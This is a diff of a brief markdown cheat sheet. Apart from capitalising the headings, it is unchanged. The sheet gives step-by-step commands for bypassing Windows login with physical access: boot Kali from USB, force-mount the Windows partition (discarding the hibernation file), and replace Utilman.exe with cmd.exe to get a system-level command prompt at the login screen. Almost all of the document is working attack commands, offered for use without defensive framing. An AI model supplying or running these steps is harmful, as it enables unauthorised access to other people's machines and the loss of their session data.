@@ -1,36 +1,36 @@
-### boot kali from usb stick
+### Boot kali from usb stick
 ```
 mkdir /mnt/windows
 ```
 
-### mount windows partition
+### Mount windows partition
 ```
 mount /dev/<windowsPartition> /mnt/windows
 ```
 
-### if error occurs while mounting (Windows is hibernated, refuse to mount)
+### If error occurs while mounting (Windows is hibernated, refuse to mount)
 ```
 umount /dev/<windowsPartition>
 mount -t ntfs-3g -o remove_hiberfile /dev/<windowsPartition> /mnt/windows
 cd /mnt/windows/Windows/System32
 ```
 
-### create backup
+### Create backup
 ```
 cp Utilman.exe backup.exe
 ```
 
-### replace utilman with cmd
+### Replace utilman with cmd
 ```
 cp cmd.exe Utilman.exe
 ```
 
-### umount
+### Umount
 ```
 umount -R /mnt
 ```
 
-### shut down kali and boot windows system ->  click "Utilman"
+### Shut down kali and boot windows system ->  click "Utilman"
 ```
 ```
 
